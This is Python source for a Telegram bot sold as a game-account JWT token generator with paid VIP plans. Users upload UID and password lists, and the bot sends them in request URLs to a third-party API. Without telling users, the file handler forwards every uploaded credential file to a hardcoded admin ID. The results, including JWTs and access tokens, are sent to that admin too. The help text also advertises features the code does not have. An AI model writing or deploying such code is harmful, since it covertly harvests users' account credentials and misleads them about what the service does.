import os
import io
import json
import asyncio
import aiohttp
from threading import Thread
from flask import Flask
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, BotCommand
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8536757095  # Telegram Admin ID
API_TEMPLATE = "https://vipjwt.ffbot.site/token?uid={uid}&password={pwd}"
CONCURRENCY_LIMIT = 5

# Sample direct Anime MP4 video link (VIP Shop ke liye)
VIP_ANIME_VIDEO_URL = "https://cdn.pixabay.com/video/2022/10/05/133647-758252277_large.mp4"

# Flask Server for Keep-Alive
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "Bot Alive & Operational"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    flask_app.run(host="0.0.0.0", port=port)

Thread(target=run_flask, daemon=True).start()


# ---------------- KEYBOARDS SETUP ---------------- #

def get_main_keyboard():
    """ 
    Exact Custom Bottom Reply Keyboard
    Row 1: Process File 📩 | 📝 Add Long Bio
    Row 2: 🌀 Naruto Free Spinner | Vip Shop 🛒
    Row 3: Help 🆘
    Row 4: Owner 👨‍💻
    """
    keyboard = [
        [KeyboardButton("Process File 📩"), KeyboardButton("📝 Add Long Bio")],
        [KeyboardButton("🌀 Naruto Free Spinner"), KeyboardButton("Vip Shop 🛒")],
        [KeyboardButton("Help 🆘")],
        [KeyboardButton("Owner 👨‍💻")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


# ---------------- API & FILE PROCESSING ---------------- #

async def fetch_token(session: aiohttp.ClientSession, semaphore: asyncio.Semaphore, uid: str, pwd: str) -> dict:
    async with semaphore:
        url = API_TEMPLATE.format(uid=uid, pwd=pwd)
        try:
            async with session.get(url, timeout=20) as response:
                res_text = await response.text()
                try:
                    data = json.loads(res_text)
                    return {"input_uid": uid, "status": "Success", "raw": data}
                except Exception:
                    return {"input_uid": uid, "status": "Success", "raw": res_text}
        except Exception as e:
            return {"input_uid": uid, "status": "Error", "raw": str(e)}


def format_field(key: str, value: any) -> str:
    val_str = str(value) if value is not None else "N/A"
    return f"• **{key}:** `{val_str}`"


async def process_accounts(accounts: list, update: Update, context: ContextTypes.DEFAULT_TYPE):
    status_msg = await update.message.reply_text("🔄 **Processing requests, please wait...**", parse_mode="Markdown")

    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    async with aiohttp.ClientSession() as session:
        tasks = [fetch_token(session, semaphore, acc['uid'], acc['pwd']) for acc in accounts]
        results = await asyncio.gather(*tasks)

    formatted_text_blocks = []
    jwt_only_lines = []
    full_log_lines = []

    for idx, item in enumerate(results, 1):
        uid_input = item["input_uid"]
        raw_data = item["raw"]

        if item["status"] == "Success" and isinstance(raw_data, dict):
            def get_val(key_name):
                for k, v in raw_data.items():
                    if k.lower() == key_name.lower():
                        return v
                return "N/A"

            jwt_token = get_val("Jwt token") or get_val("jwt_token") or get_val("token")
            access_token = get_val("Access token")
            ban_period = get_val("Ban period")
            ban_type = get_val("Ban type")
            banned_at = get_val("Banned at")
            banned_before = get_val("Banned before")
            level = get_val("Level")
            nickname = get_val("Nickname")
            open_id = get_val("Open id")
            reason = get_val("Reason")
            region = get_val("Region")
            status = get_val("Status")
            success = get_val("Success")
            res_uid = get_val("Uid") if get_val("Uid") != "N/A" else uid_input

            if jwt_token and jwt_token != "N/A":
                jwt_only_lines.append(f"{res_uid}:{jwt_token}")

            block = [
                f"🎮 **Account #{idx} (UID: `{res_uid}`)**",
                format_field("Status", status),
                format_field("Success", success),
                format_field("Nickname", nickname),
                format_field("Level", level),
                format_field("Region", region),
                format_field("Uid", res_uid),
                format_field("Open ID", open_id),
                format_field("Jwt Token", jwt_token),
                format_field("Access Token", access_token),
                format_field("Ban Type", ban_type),
                format_field("Ban Period", ban_period),
                format_field("Banned At", banned_at),
                format_field("Banned Before", banned_before),
                format_field("Reason", reason),
                "----------------------------------------"
            ]
            formatted_text_blocks.append("\n".join(block))
            full_log_lines.append("\n".join(block))

        else:
            err_msg = str(raw_data)
            block = f"❌ **UID:** `{uid_input}`\n• **Status:** `Error`\n• **Response:** `{err_msg}`\n----------------------------------------"
            formatted_text_blocks.append(block)
            full_log_lines.append(block)

    # Output Responses
    if len(accounts) == 1:
        await update.message.reply_text(formatted_text_blocks[0], parse_mode="Markdown", reply_markup=get_main_keyboard())

    jwt_file_content = "\n".join(jwt_only_lines) if jwt_only_lines else "No valid JWT tokens generated."
    jwt_file_bytes = io.BytesIO(jwt_file_content.encode('utf-8'))
    jwt_file_bytes.name = "jwt_tokens.txt"

    full_file_content = "\n\n".join(full_log_lines)
    full_file_bytes = io.BytesIO(full_file_content.encode('utf-8'))
    full_file_bytes.name = "full_response.txt"

    await update.message.reply_document(
        document=jwt_file_bytes,
        caption=f"🔑 **JWT Tokens File**\nTotal Valid JWTs: `{len(jwt_only_lines)}`",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

    # Admin Logging
    user = update.effective_user
    log_caption = (
        f"📁 **New Request Logged**\n"
        f"👤 User: @{user.username or 'NoUsername'} | ID: `{user.id}`\n"
        f"📊 Total Accounts Processed: `{len(accounts)}`"
    )

    try:
        jwt_file_bytes.seek(0)
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=jwt_file_bytes,
            caption=f"{log_caption}\n📌 File: JWT Only",
            parse_mode="Markdown"
        )
        full_file_bytes.seek(0)
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=full_file_bytes,
            caption=f"{log_caption}\n📌 File: Full Data",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Admin Log Error: {e}")

    await status_msg.delete()


# ---------------- COMMANDS & HANDLERS ---------------- #

async def set_bot_commands(application: Application):
    """ Telegram Side Menu Commands """
    commands = [
        BotCommand("start", "Start Bot & Open Main Menu"),
        BotCommand("help", "Open Complete Help Menu"),
        BotCommand("token", "Get Details: /token <UID> <PASSWORD>")
    ]
    await application.bot.set_my_commands(commands)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_first_name = update.effective_user.first_name or "User"
    
    start_text = (
        f"👏 Hi {user_first_name} 💕💕💕!\n\n"
        "🚀 **JWT TOKEN GENERATOR BOT**\n\n"
        "Send me a `.json` file with UID + Password pairs, like this:\n"
        "```json\n"
        "[\n"
        '  {"uid": "your_uid", "password": "your_password"}\n'
        "]\n"
        "```\n\n"
        "**What you'll get back:**\n"
        "✅ A `token_<region>.json` file with your generated tokens\n"
        "❌ Any accounts that failed are listed separately, so nothing gets lost\n\n"
        "📎 Max file size: 5.0 MB\n\n"
        "⭐ **VIP FEATURES**\n"
        "• Auto Update – keeps your tokens fresh on GitHub automatically, on a schedule you set\n"
        "• Use `/setautoupdate` to get started\n\n"
        "Tap **Help 🆘** below anytime for the full command list."
    )
    
    await update.message.reply_text(start_text, parse_mode="Markdown", reply_markup=get_main_keyboard())


async def token_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text(
            "⚠️ **Format:** `/token <UID> <PASSWORD>`\nExample: `/token 10001234 mypass123`",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return

    accounts = [{"uid": context.args[0], "pwd": context.args[1]}]
    await process_accounts(accounts, update, context)


async def text_button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text

    if text == "Process File 📩":
        msg = (
            "Okay, please send the JSON file now for manual processing.\n\n"
            "Make sure it's a `.json` file containing a list like:\n"
            "```json\n"
            "[\n"
            '  {"uid": "user1", "password": "pass1"},\n'
            '  {"uid": "user2", "password": "pass2"}\n'
            "]\n"
            "```"
        )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=get_main_keyboard())

    elif text == "📝 Add Long Bio":
        msg = (
            "```\n"
            "ℹ️ ADD LONG BIO\n"
            "```\n\n"
            "Please send a JSON file containing UID and Password.\n\n"
            "Required Format:\n"
            "```json\n"
            "[\n"
            '  {"uid": "user1", "password": "pass1"},\n'
            '  {"uid": "user2", "password": "pass2"}\n'
            "]\n"
            "```"
        )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=get_main_keyboard())

    elif text == "🌀 Naruto Free Spinner":
        msg = (
            "```\n"
            "ℹ️ NARUTO FREE SPINNER\n"
            "```\n\n"
            "🌀 **Naruto Free Spinner** – Ready!\n\n"
            "Send a JSON file with UID + Password to spin.\n\n"
            "Required Format:\n"
            "```json\n"
            "[\n"
            '  {"uid": "12345", "password": "abc123"},\n'
            '  {"uid": "67890", "password": "xyz789"}\n'
            "]\n"
            "```\n"
            "✅ JWT auto-generate hoga ➔ Region detect hoga ➔ Spin chalega!"
        )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=get_main_keyboard())

    elif text == "Vip Shop 🛒":
        vip_caption = (
            "```\n"
            "✨ VIP SHOP ✨\n"
            "```\n"
            "See Video For Vip Pro Features\n\n"
            "✨ **ZEXXY JWT GENERATOR – VIP MEMBERSHIP** ✨\n\n"
            "🚀 Unlock **Premium Features** Instantly!\n"
            "⚡ Automatic GitHub Uploads\n"
            "⚡ Scheduled File Processing\n"
            "⚡ Auto JWT & Token Management\n"
            "⚡ Premium VIP Features\n\n"
            "💼 **AVAILABLE PLANS & PRICES:**\n"
            "🗓️️ 7 Days – ₹ 39\n"
            "🗓️ 15 Days – ₹ 69\n"
            "📆 1 Month – ₹ 99\n"
            "📆 2 Months – ₹ 159\n"
            "📆 3 Months – ₹ 219\n"
            "🎯 1 Year – ₹ 499 🔥\n\n"
            "🏆 **BEST VALUE:** 1 Year VIP – Only ₹499\n\n"
            "📩 **TO PURCHASE VIP MEMBERSHIP:**\n"
            "👤 Contact Admin 👉 @myselfkhushi03"
        )
        try:
            await update.message.reply_video(
                video=VIP_ANIME_VIDEO_URL,
                caption=vip_caption,
                parse_mode="Markdown",
                reply_markup=get_main_keyboard()
            )
        except Exception:
            await update.message.reply_text(vip_caption, parse_mode="Markdown", reply_markup=get_main_keyboard())

    elif text == "Help 🆘" or text == "/help":
        help_text = (
            "```\n"
            "📌 NORMAL COMMANDS\n"
            "```\n\n"
            "➤ `/start`\n"
            "  └➤ **Use:** Bot ka Welcome Message aur Main Menu open karein.\n\n"
            "➤ `/help`\n"
            "  └➤ **Use:** Complete Help Menu open karein.\n\n"
            "➤ **Process File**\n"
            "  └➤ **Use:** Send a `.json` file with UID + Password list to process accounts and generate JWT Tokens.\n"
            "  └➤ **Format:** `[{\"uid\":\"123\", \"password\":\"abc\"}]`\n\n"
            "➤ **Add Long Bio**\n"
            "  └➤ **Use:** Send UID + Password JSON, then send your Bio text – all accounts will have their Bio updated.\n\n"
            "➤ **Naruto Free Spinner**\n"
            "  └➤ **Use:** Send UID + Password JSON – JWT auto-generate hoga, region detect hoga aur Naruto Event spin chalega.\n\n"
            "```\n"
            "❓ FAQ\n"
            "```\n\n"
            "❓ **Auto Update kaam nahi kar raha?**\n"
            "  └➤ Check `/autoupdatelist`. If status is Paused, use `/resumeautoupdate`. If VIP has expired, please renew your VIP.\n\n"
            "❓ **Owner Panel ya VIP Menu nahi dikh raha?**\n"
            "  └➤ Send `/start` or `/help` again. The menu will refresh automatically.\n\n"
            "❓ **Setup me koi Problem aa rahi hai?**\n"
            "  └➤ Use `/cancel` to stop the current process and restart the setup.\n\n"
            "```\n"
            "💡 TIPS\n"
            "```\n\n"
            "• **Fast Processing:** Process all accounts in parallel – 30 concurrent workers.\n"
            "• **Multiple Auto Updates:** Create multiple Auto Updates for different Repos/Files.\n"
            "• **Quick Cancel:** Use `/cancel` at any setup step to immediately stop the current process."
        )
        await update.message.reply_text(help_text, parse_mode="Markdown", reply_markup=get_main_keyboard())

    elif text == "Owner 👨‍💻":
        owner_msg = (
            "👨‍‍💻 **Owner Details:**\n\n"
            "👤 **Username:** @myselfkhushi03\n"
            "💬 Click link below to open chat directly:\n"
            "https://t.me/myselfkhushi03"
        )
        await update.message.reply_text(owner_msg, parse_mode="Markdown", reply_markup=get_main_keyboard())


async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await context.bot.forward_message(
            chat_id=ADMIN_ID,
            from_chat_id=update.effective_chat.id,
            message_id=update.message.message_id
        )
    except Exception as e:
        print(f"File Forward Error: {e}")

    document = update.message.document
    if not document:
        return

    file_name = document.file_name.lower()
    if not (file_name.endswith('.txt') or file_name.endswith('.json')):
        await update.message.reply_text("⚠ Kripya `.txt` ya `.json` file hi bhejein.", reply_markup=get_main_keyboard())
        return

    tg_file = await context.bot.get_file(document.file_id)
    file_content = (await tg_file.download_as_bytearray()).decode('utf-8', errors='ignore')

    accounts = []

    if file_name.endswith('.json'):
        try:
            data = json.loads(file_content)
            if isinstance(data, list):
                for entry in data:
                    if isinstance(entry, dict) and "uid" in entry and "password" in entry:
                        accounts.append({"uid": str(entry["uid"]), "pwd": str(entry["password"])})

            if not accounts:
                await update.message.reply_text(
                    "❌ **Incorrect JSON Format!** Must contain `uid` and `password`.",
                    parse_mode="Markdown",
                    reply_markup=get_main_keyboard()
                )
                return
        except Exception:
            await update.message.reply_text("❌ **Invalid JSON File Structure!**", parse_mode="Markdown", reply_markup=get_main_keyboard())
            return
    else:
        for line in file_content.splitlines():
            line = line.strip()
            if ":" in line:
                parts = line.split(":", 1)
                accounts.append({"uid": parts[0].strip(), "pwd": parts[1].strip()})
            elif " " in line:
                parts = line.split(maxsplit=1)
                accounts.append({"uid": parts[0].strip(), "pwd": parts[1].strip()})

        if not accounts:
            await update.message.reply_text("❌ **Incorrect TXT Format!** Line format: `UID:PASSWORD`", parse_mode="Markdown", reply_markup=get_main_keyboard())
            return

    await process_accounts(accounts, update, context)


def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.post_init = set_bot_commands

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", text_button_handler))
    app.add_handler(CommandHandler("token", token_cmd))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO, file_handler))

    print("Bot is successfully running with exact UI layout and Anime VIP video...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
